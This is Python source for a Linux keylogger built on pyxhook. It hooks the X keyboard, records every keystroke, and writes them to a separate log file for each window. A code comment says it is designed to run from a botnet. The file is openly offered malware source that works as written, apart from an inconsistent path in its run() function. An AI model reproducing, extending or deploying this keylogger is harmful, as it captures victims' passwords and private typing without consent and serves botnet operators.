import pyxhook
import sys
import os
import errno

# This module is a basic keylogging module which will create a log
# for each different window. It uses the pyxhook library to hook into
# X, so this only works on linux machines. It's designed to be run from 
# the botnet itself.

path = None
def main():
	if (len(sys.argv) < 2):
	        print "Correct usage is: python keylogger.py [logfile directory]"
	        sys.exit(1)
	path = sys.argv[1]
	try: 
	    os.makedirs(path)
	except OSError:
	    if not os.path.isdir(path):
	        raise

	hook = pyxhook.HookManager()
	hook.KeyDown=logkey
	hook.HookKeyboard()
	hook.start()
def run():
	path = 'logfolder'
	try: 
	    os.makedirs(path)
	except OSError:
	    if not os.path.isdir(path):
	        raise

	hook = pyxhook.HookManager()
	hook.KeyDown=logkey
	hook.HookKeyboard()
	hook.start()

#cleans up some of the log files
def catchSpecial(key):
	if key == 'Return':
		return '\n'
	elif key == 'Shift_R':
		return '[R_Shift]'
	elif key == 'Shift_L':
		return '[L_Shift]'
	elif key == 'Control_L':
		return '[L_Control]'
	elif key == 'Control_R':
		return '[R_Control]'
	elif key == 'space':
		return ' '
	elif key == 'Alt_R':
		return '[R_Alt]'
	elif key == 'Alt_L':
		return '[L_Alt]'
	elif key == 'Escape':
		return '[Escape]'
	else:
		return key
# This will create a log for each different window so its easier 
# to know what program corresponds to what key presses
def logkey(event):

	path = sys.argv[1]
	logname = path+'/'+str(event.WindowProcName).strip() + ".log"
	f=open(logname,'a')
	f.write(catchSpecial(event.Key))
	f.close()

if __name__ == '__main__':
	main()